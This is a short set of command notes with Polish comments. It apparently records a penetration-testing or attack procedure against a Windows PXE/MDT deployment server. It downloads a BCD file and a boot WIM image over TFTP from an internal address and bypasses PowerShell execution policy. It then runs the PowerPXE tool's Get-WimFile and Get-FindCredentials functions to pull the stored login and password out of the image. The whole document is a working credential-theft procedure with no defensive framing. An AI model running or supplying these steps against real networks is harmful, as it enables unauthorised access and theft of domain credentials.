# folder roboczy
cd Documents
mkdir aaa
copy C:\powerpxe aaa\
cd aaa

#pobieranie pliku bcd
tftp -i 10.200.32.202 GET "\Tmp\x64{13D022D5-50BA-41E7-A288-E4D56B11E4D5}.bcd" conf.bcd
#Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
# odblokowanie powershell 
powershell -executionpolicy bypass 
# szukanie ścieżki obrazu
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
# wypluje np >>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
# od razu można pobrać
tftp -i 10.200.32.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
# potrwa z 3 minuty
Get-FindCredentials -WimFile pxeboot.wim
# odnalezienie loginu i hasła